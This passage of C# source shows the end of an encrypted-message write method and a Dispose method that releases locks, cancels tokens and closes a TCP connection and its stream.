                await SecureChannel.WriteEncryptedMessage(Stream, msgType, payload, AesKey);
            }
            finally
            {
                _writeLock.Release();
            }
        }

        public void Dispose()
        {
            if (_disposed) return;
            _disposed = true;

            try { _cts.Cancel(); } catch { }
            try { CommandSignal.Release(); } catch { }

            try { Stream?.Dispose(); } catch { }
            try { _tcpClient?.Close(); } catch { }

            _writeLock?.Dispose();
            _cts?.Dispose();
        }
    }
}
